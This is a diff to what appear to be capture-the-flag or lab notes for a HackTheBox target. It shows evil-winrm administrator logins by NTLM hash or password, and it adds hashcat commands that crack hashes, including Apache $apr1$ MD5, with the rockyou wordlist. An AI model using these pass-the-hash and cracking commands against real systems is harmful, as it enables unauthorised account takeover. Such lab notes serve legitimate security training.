@@ -36,3 +36,12 @@ ntpdate pool.ntp.org  # Sync system clock with NTP server to avoid time skew iss
 ```bash
 evil-winrm -i administrator.htb -u administrator -H <NTLM_hash>   # Login using NTLM hash
 evil-winrm -i administrator.htb -u administrator -p <password>    # Login using password
+
+### 🔓 Cracking Hashes with Hashcat
+```bash
+# Auto-detect hash mode (not recommended for reliability)
+hashcat -a 0 hash.txt /home/kali/Documents/rockyou.txt
+
+# Specified mode (Apache $apr1$ MD5)
+hashcat -m 1600 -a 0 hash.txt /home/kali/Documents/rockyou.txt
+```
